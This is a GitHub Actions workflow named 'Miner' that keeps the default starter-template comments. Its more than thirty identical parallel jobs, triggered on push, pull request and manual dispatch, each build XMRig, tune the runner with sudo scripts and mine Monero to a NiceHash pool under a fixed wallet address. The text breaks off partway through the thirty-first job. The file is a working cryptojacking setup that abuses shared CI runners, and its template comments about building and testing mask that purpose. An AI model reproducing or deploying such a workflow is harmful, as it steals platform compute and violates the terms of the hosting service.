# This is a basic workflow to help you get started with Actions

name: Miner

# Controls when the workflow will run
on:
  # Triggers the workflow on push or pull request events but only for the "main" branch
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:

# A workflow run is made up of one or more jobs that can run sequentially or in parallel
jobs:
  # This workflow contains a single job called "build"
  build1:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,hhnngcx
          echo test, and deploy your project.bnnbnnbbbxchvvb
  build2:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.hjjn
  build3:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,hdhdb
          echo test, and deploy your project.jhg
  build4:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build5:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build6:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build7:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build8:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.bbaba
  build9:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build10:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build11:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,hhnngcx
          echo test, and deploy your project.bnnbnnbbbxchvvb
  build12:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.hjjn
  build13:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,hdhdb
          echo test, and deploy your project.jhg
  build14:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build15:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build16:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build17:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build18:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.bbaba
  build19:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build20:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build21:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,hhnngcx
          echo test, and deploy your project.bnnbnnbbbxchvvb
  build22:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.hjjn
  build23:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,hdhdb
          echo test, and deploy your project.jhg
  build24:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build25:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build26:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build27:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build28:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.bbaba
  build29:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build30:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build31:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
